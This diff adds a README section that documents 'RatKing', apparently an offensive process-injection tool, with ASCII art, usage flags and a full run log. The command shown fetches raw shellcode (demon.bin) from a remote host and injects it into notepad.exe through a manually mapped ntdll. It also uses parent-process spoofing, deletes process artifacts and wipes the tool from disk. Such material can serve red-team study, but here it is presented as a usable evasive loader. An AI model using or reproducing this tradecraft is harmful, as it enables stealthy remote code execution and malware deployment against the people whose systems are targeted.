@@ -200,6 +200,95 @@ Process Injector 3 (Wrapper): Bloater (Process Mitigation Policy)
 ```
 
 ### RatKing
+```
+C:\>RatKing.exe -u http://192.168.231.128:9090/demon.bin -t notepad -p 4160 -k
+
+              .'''''-,              ,-`````.
+              `-.._  |              |  _..-'
+                 \    `,          ,'    /
+                 '=   ,/          \,   =`
+                 '=   (            )   =`
+                .\    /            \    /.
+               /  `,.'              `.,'  \
+               \   `.                ,'   /
+                \    \              /    /
+                 \   .`.  __.---. ,`.   /
+                  \.' .'``        `. `./
+                   \.'  -'''-..     `./
+                   /  /        '.      \
+                  /  / .--  .-'''`      '.
+                 '   |    ,---.    _      \
+     /``-----._.-.   \   / ,-. '-'   '.   .-._.-----``\
+     \__ .     | :    `.' ((O))   ,-.  \  : |     . __/
+      `.  '-...\_`     |   '-'   ((O)) |  '_/...-`  .'
+ .----..)    `    \     \      /  '-'  / /    '    (..----.
+(o      `.  /      \     \    /\     .' /      \  .'      o)
+ ```---..   `.     /`.    '--'  '---' .'\     .'   ..---```
+         `-.  `.  /`.  `.           .' .'\  .'  .-'
+            `..` /   `.'  ` - - - ' `.'   \ '..'
+                /    /                \    \
+               /   ,'                  `.   \
+               \  ,'`.                .'`.  /
+                `/    \              /    \'
+                 ,=   (              )   =,
+                 ,=   '\            /`   =,
+   RatKing       /    .'            `.    \
+              .-'''  |                |  ```-.
+              `......'                `......'
+
+Process Injector 4: RatKing (Manual Mapping ntdll.dll)
+
+  -u, --url      Required. Remote URL address for raw shellcode.
+
+  -t, --target   Specify the target/victim process. Default: Self-injection
+
+  -p, --parent   Spoof victim process under a Parent Process ID (This option is ignored for self-injection)
+
+  -k, --kill     Enable self-destruct to auto wipe file from disk.
+
+  -h, --help     Display help screen manual.
+
+|--------------
+| Payload       : http://192.168.231.128:9090/demon.bin
+| Process       : C:\Windows\System32\notepad.exe
+| PPID Spoofing : 4160
+| Self Destruct : True
+|--------------
+
+[>] Resolving Addresses of ntdll.dll
+    |-> Original ntdll.dll: 0x7ff856c10000
+    |-> New copy of ntdll.dll: 0x1a068730000
+    
+[>] CreateProcessW()
+    |-> Target Process Created!
+    |-> PID: 9168
+
+[>] Fetching Payload
+    |-> Payload retrieved successfully!
+
+[>] NtAllocateVirtualMemory()
+    |-> Base Address: 0x28D20A30000
+
+[>] NtWriteVirtualMemory()
+    |-> Shellcode Injected!
+
+[>] NtProtectVirtualMemory()
+    |-> Flipping Memory Protection!
+
+[>] NtCreateThreadEx()
+    |-> Shellcode Executed!
+
+[>] DeleteProcThreadAttributeList()
+    |-> Deleting Process Artifacts!
+
+[>] CloseHandle()
+    |-> Closing Process Handle!
+
+[>] CloseHandle()
+    |-> Closing Thread Handle!
+
+[>] RatKing.exe removed from disk!
+```
 
 ### RustKing
 ```
